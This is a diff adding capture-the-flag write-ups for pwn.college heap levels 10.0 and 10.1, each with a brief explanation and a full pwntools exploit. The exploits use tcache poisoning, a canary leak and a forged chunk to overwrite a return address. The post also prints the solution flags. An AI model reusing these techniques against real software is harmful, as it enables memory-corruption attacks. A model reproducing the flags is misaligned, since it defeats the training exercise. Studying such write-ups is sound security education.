@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-09-30
+updated: 2025-10-01
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -2004,3 +2004,305 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{YpgPY9CRd5Wk4FCJ7klY0D4fwXX.0FO4MDL5cTNxgzW}`]
+
+# Level 10.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to gain control flow.
+
+## Write-up
+
+这题嘛，保护全开，但是直接泄漏给我们栈地址和程序代码段地址了，发现后门函数 `win`，那想法自然是令 malloc 返回栈地址，然后我们 scanf 向栈内输入数据溢出返回地址 balabala ～
+
+由于程序使用了 `malloc_usable_size` 来确定输入大小，所以我们还得伪造一个 chunk size 来欺骗这个函数，才能得到足够的输入空间。此外，canary 也需要我们提前泄漏出来。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level10.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    target.recvuntil(b"allocations is at: ")
+    stack = int(target.recvline().strip()[:-1], 16)
+    target.recvuntil(b"main is at: ")
+    pie_base = int(target.recvline().strip()[:-1], 16) - 0x1AFD
+
+    fake_chunk = stack + 0x10
+    canary = stack + 0x108
+    win = pie_base + 0x1A00
+
+    target.success(f"stack: {hex(stack)}")
+    target.success(f"pie_base: {hex(pie_base)}")
+    target.success(f"fake_chunk: {hex(fake_chunk)}")
+    target.success(f"canary: {hex(canary)}")
+    target.success(f"win: {hex(win)}")
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+
+    # raw_input("DEBUG")
+    scanf(0, p64(canary + 1))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+    target.recvuntil(b"Data: ")
+    canary = int.from_bytes(target.recvline().strip().rjust(0x8, b"\x00"), "little")
+    target.success(f"canary: {hex(canary)}")
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p64(stack))
+    malloc(0, 0)
+    malloc(0, 0)
+
+    # fake chunk
+    payload = flat(
+        0,
+        0x200, # chunk size
+    )
+    scanf(0, payload)
+
+    malloc(2, 0)
+    malloc(3, 0)
+    free(3)
+    free(2)
+    # raw_input("DEBUG")
+    scanf(2, p64(fake_chunk))
+    malloc(2, 0)
+    malloc(2, 0)
+
+    payload = flat(
+        b"A" * 0xF8,
+        canary,
+        0,  # rbp
+        win,
+    )
+    # raw_input("DEBUG")
+    scanf(2, payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{0qLPdKCSvtNobMR6JycB-1ThuJM.0VO4MDL5cTNxgzW}`]
+
+# Level 10.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to gain control flow.
+
+## Write-up
+
+参见 [Level 10.0](#level-100)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level10.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    target.recvuntil(b"allocations is at: ")
+    stack = int(target.recvline().strip()[:-1], 16)
+    target.recvuntil(b"main is at: ")
+    pie_base = int(target.recvline().strip()[:-1], 16) - 0x1AFD
+
+    fake_chunk = stack + 0x10
+    canary = stack + 0x108
+    win = pie_base + 0x1A00
+
+    target.success(f"stack: {hex(stack)}")
+    target.success(f"pie_base: {hex(pie_base)}")
+    target.success(f"fake_chunk: {hex(fake_chunk)}")
+    target.success(f"canary: {hex(canary)}")
+    target.success(f"win: {hex(win)}")
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+
+    # raw_input("DEBUG")
+    scanf(0, p64(canary + 1))
+    malloc(0, 0)
+    malloc(0, 0)
+    puts(0)
+    target.recvuntil(b"Data: ")
+    canary = int.from_bytes(target.recvline().strip().rjust(0x8, b"\x00"), "little")
+    target.success(f"canary: {hex(canary)}")
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p64(stack))
+    malloc(0, 0)
+    malloc(0, 0)
+
+    # fake chunk
+    payload = flat(
+        0,
+        0x200,  # chunk size
+    )
+    scanf(0, payload)
+
+    malloc(2, 0)
+    malloc(3, 0)
+    free(3)
+    free(2)
+    # raw_input("DEBUG")
+    scanf(2, p64(fake_chunk))
+    malloc(2, 0)
+    malloc(2, 0)
+
+    payload = flat(
+        b"A" * 0xF8,
+        canary,
+        0,  # rbp
+        win,
+    )
+    # raw_input("DEBUG")
+    scanf(2, payload)
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{IVJX2ecO9cCeTd-08IgNfDhvyxY.0FM5MDL5cTNxgzW}`]
